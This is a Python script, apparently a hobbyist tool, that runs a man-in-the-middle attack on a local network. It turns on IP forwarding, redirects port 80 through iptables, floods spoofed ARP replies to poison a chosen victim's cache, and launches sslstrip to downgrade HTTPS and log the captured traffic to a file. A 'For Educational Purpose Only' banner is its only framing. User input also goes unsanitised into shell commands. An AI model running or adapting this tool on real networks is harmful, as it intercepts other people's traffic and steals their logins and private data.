#!/usr/bin/env python

import os
from scapy.all import *
import threading

example = """
Usage-Example  (make sure you run as sudo)
Target? 192.168.1.2-255
Gateway? 192.168.1.1
Log file destination: /root/Desktop/test.log\n\n\n"""

print example
victim = raw_input("Target? ")
gw = raw_input("Gateway? ")
port = raw_input("Port for sslstrip (8080 recomended) :  ")
file = raw_input("Log file destination: ")

banner = """

+-----+-----+-----+-----+-----+-----+
|***********************************|
|***********************************|
+***********************************+
|***********************************|
|****For Educational Purpose Only***|
+***********Author - $aideep********+ 
|*********ARPSPOOF+SSLSTRIP*********|
|***********************************|
+***********************************+
|***********************************|
|***********************************|
+-----+-----+-----+-----+-----+-----+
"""


print banner



os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
os.system("iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port "+port)



def attack_victim(victim,gw):
	pkt = Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(psrc=gw,pdst=victim)
	print "*******Poisoning Finished**********"
	while True:
		sendp(pkt,verbose=False)

def attack_gw(victim,gw):
	pkt = Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(psrc=victim,pdst=gw)
	while True:
		sendp(pkt,verbose=False)
def sslstrip(file):
	os.system("sslstrip -k -l "+port+" -w " +file)

th_victim = threading.Thread(target=attack_victim,args=(victim,gw))
th_gw = threading.Thread(target=attack_gw,args=(victim,gw))
th_ssl = threading.Thread(target=sslstrip,args=(file,))

th_ssl.start()
th_victim.start()

# th_gw.start()

